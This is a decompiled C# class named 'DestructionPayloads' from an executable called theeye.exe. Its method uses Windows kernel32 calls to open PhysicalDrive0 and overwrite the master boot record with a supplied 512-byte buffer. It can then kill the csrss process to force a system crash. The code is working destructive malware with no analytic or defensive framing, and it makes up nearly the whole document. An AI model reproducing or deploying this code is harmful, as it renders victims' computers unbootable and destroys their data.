// Decompiled with JetBrains decompiler
// Type: TheEye.DestructionPayloads
// Assembly: TheEye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F112655-6C2B-4871-B1D6-7F6EA80D9DFB
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\theeye.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TheEye
{
  internal class DestructionPayloads
  {
    private const uint GenericRead = 2147483648;
    private const uint GenericWrite = 1073741824;
    private const uint GenericExecute = 536870912;
    private const uint GenericAll = 268435456;
    private const uint FileShareRead = 1;
    private const uint FileShareWrite = 2;
    private const uint OpenExisting = 3;
    private const uint FileFlagDeleteOnClose = 1073741824;
    private const uint MbrSize = 512;

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
      string lpFileName,
      uint dwDesiredAccess,
      uint dwShareMode,
      IntPtr lpSecurityAttributes,
      uint dwCreationDisposition,
      uint dwFlagsAndAttributes,
      IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
      IntPtr hfile,
      byte[] lpBuffer,
      uint nNumberOfBytesToWrite,
      out uint lpNumberBytesWritten,
      IntPtr lpOverlapped);

    public static void OverwriteMBR(byte[] MBRHex, bool BSoD)
    {
      DestructionPayloads.WriteFile(DestructionPayloads.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), MBRHex, 512U, out uint _, IntPtr.Zero);
      if (!BSoD)
        return;
      Process.GetProcessesByName("csrss")[0].Kill();
    }
  }
}
